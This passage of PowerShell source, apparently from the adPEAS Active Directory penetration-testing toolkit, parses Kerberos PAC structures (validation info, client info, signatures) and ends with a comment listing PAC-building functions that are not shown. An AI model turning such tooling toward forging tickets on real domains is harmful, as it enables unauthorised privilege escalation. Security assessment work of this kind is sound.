        $result.UserRID = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # PrimaryGroupId (4 bytes)
        $result.PrimaryGroupRID = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # GroupCount (4 bytes)
        $groupCount = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # GroupIds pointer (4 bytes)
        $groupsPtr = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # UserFlags (4 bytes)
        $offset += 4

        # UserSessionKey (16 bytes)
        $offset += 16

        # LogonServer (RPC_UNICODE_STRING - 8 bytes)
        $logonServerPtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # LogonDomainName (RPC_UNICODE_STRING - 8 bytes)
        $domainNamePtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # LogonDomainId pointer (4 bytes)
        $domainSidPtr = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # Reserved1 (8 bytes)
        $offset += 8

        # UserAccountControl (4 bytes)
        $result.UserAccountControl = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # SubAuthStatus (4 bytes)
        $offset += 4

        # LastSuccessfulILogon (8 bytes)
        $offset += 8

        # LastFailedILogon (8 bytes)
        $offset += 8

        # FailedILogonCount (4 bytes)
        $offset += 4

        # Reserved3 (4 bytes)
        $offset += 4

        # SidCount (4 bytes)
        $sidCount = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # ExtraSids pointer (4 bytes)
        $extraSidsPtr = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # ResourceGroupDomainSid pointer (4 bytes) - skip
        $offset += 4

        # ResourceGroupCount (4 bytes) - skip
        $offset += 4

        # ResourceGroupIds pointer (4 bytes) - skip
        $offset += 4

        Write-Log "[Read-KerbValidationInfo] Fixed structure parsed. UserRID=$($result.UserRID), PrimaryGrp=$($result.PrimaryGroupRID), GroupCount=$groupCount, SidCount=$sidCount" -Level Debug
        Write-Log "[Read-KerbValidationInfo] Pointers: EffName=$effectiveNamePtr, FullName=$fullNamePtr, Groups=$groupsPtr, Domain=$domainNamePtr, DomSID=$domainSidPtr, ExtraSids=$extraSidsPtr" -Level Debug

        # === NDR REFERENT DATA ===
        # Referents appear in the order pointers were encountered in the fixed structure.
        # Helper: Read NDR conformant varying string (MaxCount(4) + Offset(4) + ActualCount(4) + data)
        $ReadNDRString = {
            param([byte[]]$d, [int]$o)
            # SAFETY: Always consume at least 12 bytes (NDR header) to prevent infinite loops
            # If we can't read the header, we're at the end of data - return remaining bytes
            if ($o + 12 -gt $d.Length) {
                $remaining = [Math]::Max(0, $d.Length - $o)
                return @{ Value = ""; BytesConsumed = $remaining }
            }
            # NDR conformant varying string: MaxCount(4) + Offset(4) + ActualCount(4) + UTF-16 data
            $ac = Read-UInt32LE -Data $d -Offset ($o + 8)    # ActualCount
            # Guard against corrupt ActualCount exceeding available data
            $maxChars = [Math]::Max(0, [Math]::Floor(($d.Length - $o - 12) / 2))
            if ($ac -gt $maxChars) { $ac = $maxChars }
            $dataLen = $ac * 2                                 # UTF-16 = 2 bytes/char
            $consumed = 12 + $dataLen
            # NDR requires alignment to 4-byte boundary after string data
            if ($consumed % 4 -ne 0) { $consumed += 4 - ($consumed % 4) }
            $val = ""
            if ($ac -gt 0 -and ($o + 12 + $dataLen) -le $d.Length) {
                $val = [System.Text.Encoding]::Unicode.GetString($d[($o + 12)..($o + 12 + $dataLen - 1)])
            }
            # SAFETY: Ensure we always move forward to prevent infinite loop
            if ($consumed -lt 12) { $consumed = 12 }
            return @{ Value = $val; BytesConsumed = $consumed }
        }

        # 1. EffectiveName referent
        if ($effectiveNamePtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $result.UserName = $str.Value
            $offset += $str.BytesConsumed
            Write-Log "[Read-KerbValidationInfo] EffectiveName: '$($str.Value)'" -Level Debug
        }

        # 2. FullName referent (skip value)
        if ($fullNamePtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $offset += $str.BytesConsumed
        }

        # 3. LogonScript referent (skip)
        if ($logonScriptPtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $offset += $str.BytesConsumed
        }

        # 4. ProfilePath referent (skip)
        if ($profilePathPtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $offset += $str.BytesConsumed
        }

        # 5. HomeDirectory referent (skip)
        if ($homeDirPtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $offset += $str.BytesConsumed
        }

        # 6. HomeDirectoryDrive referent (skip)
        if ($homeDirDrivePtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $offset += $str.BytesConsumed
        }

        # 7. GroupIds referent (conformant array of GROUP_MEMBERSHIP)
        if ($groupsPtr -ne 0 -and $groupCount -gt 0) {
            # NDR conformant array: MaxCount(4) + GroupCount * (RID(4) + Attributes(4))
            $offset += 4  # Skip MaxCount
            $groups = @()
            for ($g = 0; $g -lt $groupCount; $g++) {
                if ($offset + 8 -gt $Data.Length) { break }
                $rid = Read-UInt32LE -Data $Data -Offset $offset
                $groups += $rid
                $offset += 8  # Skip RID(4) + Attributes(4)
            }
            $result.GroupRIDs = $groups
            Write-Log "[Read-KerbValidationInfo] GroupRIDs: $($groups -join ', ')" -Level Debug
        }

        # 8. LogonServer referent (skip value)
        if ($logonServerPtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $offset += $str.BytesConsumed
        }

        # 9. LogonDomainName referent
        if ($domainNamePtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $result.Domain = $str.Value
            $offset += $str.BytesConsumed
            Write-Log "[Read-KerbValidationInfo] Domain: '$($str.Value)'" -Level Debug
        }

        # 10. LogonDomainId referent (SID)
        if ($domainSidPtr -ne 0) {
            # NDR SID: SubAuthorityCount(4 as MaxCount) + Revision(1) + SubAuthorityCount(1) + IdentifierAuthority(6) + SubAuthority(4*N)
            if ($offset + 4 -le $Data.Length) {
                $offset += 4  # Skip NDR MaxCount

                # Read actual SID structure
                if ($offset + 8 -le $Data.Length) {
                    $sidSubAuthCountActual = $Data[$offset + 1]
                    $sidLength = 8 + ($sidSubAuthCountActual * 4)  # header(8) + subauths

                    if ($offset + $sidLength -le $Data.Length) {
                        $sidBytes = $Data[$offset..($offset + $sidLength - 1)]
                        $result.DomainSID = ConvertTo-SIDString -SIDBytes $sidBytes
                        Write-Log "[Read-KerbValidationInfo] DomainSID: $($result.DomainSID)" -Level Debug
                    }
                    $offset += $sidLength
                }
                # Align to 4-byte boundary
                if ($offset % 4 -ne 0) { $offset += 4 - ($offset % 4) }
            }
        }

        # 11. ExtraSids referent (if present)
        if ($extraSidsPtr -ne 0 -and $sidCount -gt 0) {
            # NDR conformant array: MaxCount(4) + SidCount * (SID_pointer(4) + Attributes(4))
            $offset += 4  # Skip MaxCount

            # First read all pointer+attributes pairs
            $sidEntries = @()
            for ($s = 0; $s -lt $sidCount; $s++) {
                if ($offset + 8 -gt $Data.Length) { break }
                $sidPtr = Read-UInt32LE -Data $Data -Offset $offset
                $sidAttr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
                $sidEntries += @{ Ptr = $sidPtr; Attr = $sidAttr }
                $offset += 8
            }

            # Then read the actual SID referent data
            $extraSids = @()
            foreach ($entry in $sidEntries) {
                if ($entry.Ptr -ne 0 -and $offset + 4 -le $Data.Length) {
                    $offset += 4  # Skip NDR MaxCount

                    if ($offset + 8 -le $Data.Length) {
                        $sidSubAuthCountActual = $Data[$offset + 1]
                        $sidLength = 8 + ($sidSubAuthCountActual * 4)

                        if ($offset + $sidLength -le $Data.Length) {
                            $sidBytes = $Data[$offset..($offset + $sidLength - 1)]
                            $sidString = ConvertTo-SIDString -SIDBytes $sidBytes
                            if ($sidString) { $extraSids += $sidString }
                        }
                        $offset += $sidLength
                        if ($offset % 4 -ne 0) { $offset += 4 - ($offset % 4) }
                    }
                }
            }
            $result.ExtraSIDs = $extraSids
            Write-Log "[Read-KerbValidationInfo] ExtraSIDs: $($extraSids -join ', ')" -Level Debug
        }

        return $result
    }
    catch {
        Write-Log "[Read-KerbValidationInfo] Error parsing at offset $offset : $_" -Level Error
        return $result
    }
}

function Read-PACClientInfo {
    <#
    .SYNOPSIS
        Parses a PAC_CLIENT_INFO structure.

    .PARAMETER Data
        The raw PAC_CLIENT_INFO bytes.

    .OUTPUTS
        PSCustomObject with ClientId and ClientName.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data
    )

    try {
        $clientId = Read-Int64LE -Data $Data -Offset 0
        $nameLength = Read-UInt16LE -Data $Data -Offset 8

        $clientName = ""
        if ($nameLength -gt 0 -and $Data.Length -ge 10 + $nameLength) {
            $nameBytes = $Data[10..(10 + $nameLength - 1)]
            $clientName = [System.Text.Encoding]::Unicode.GetString($nameBytes)
        }

        return [PSCustomObject]@{
            ClientId = ConvertFrom-FileTime -FileTime $clientId
            ClientName = $clientName
        }
    }
    catch {
        Write-Log "[Read-PACClientInfo] Error parsing: $_" -Level Error
        return [PSCustomObject]@{
            ClientId = $null
            ClientName = ""
        }
    }
}

function Read-PACSignature {
    <#
    .SYNOPSIS
        Parses a PAC_SIGNATURE_DATA structure.

    .PARAMETER Data
        The raw PAC_SIGNATURE_DATA bytes.

    .OUTPUTS
        PSCustomObject with SignatureType and Signature bytes.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data
    )

    try {
        $signatureType = Read-Int32LE -Data $Data -Offset 0

        # Determine signature length based on type
        $sigLength = switch ($signatureType) {
            $Script:KERB_CHECKSUM_HMAC_MD5 { 16 }
            $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES128 { 12 }
            $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES256 { 12 }
            default { 16 }
        }

        $signature = $Data[4..(4 + $sigLength - 1)]

        return [PSCustomObject]@{
            SignatureType = $signatureType
            Signature = $signature
            RODCIdentifier = if ($Data.Length -gt 4 + $sigLength + 1) {
                Read-UInt16LE -Data $Data -Offset (4 + $sigLength)
            } else { 0 }
        }
    }
    catch {
        Write-Log "[Read-PACSignature] Error parsing: $_" -Level Error
        return [PSCustomObject]@{
            SignatureType = 0
            Signature = @()
            RODCIdentifier = 0
        }
    }
}

# ============================================================================
# Exported Functions (available in combined adPEAS.ps1):
# ============================================================================
# PAC Builder: Build-PAC, Complete-PACSignatures, Build-KerbValidationInfo,
#              Build-PACClientInfo, Build-PACSignature, ConvertFrom-SIDString,
#              Get-DomainSIDFromUserSID
# PAC Parser:  Read-PAC, Read-KerbValidationInfo, Read-PACClientInfo,
#              Read-PACSignature, ConvertTo-SIDString
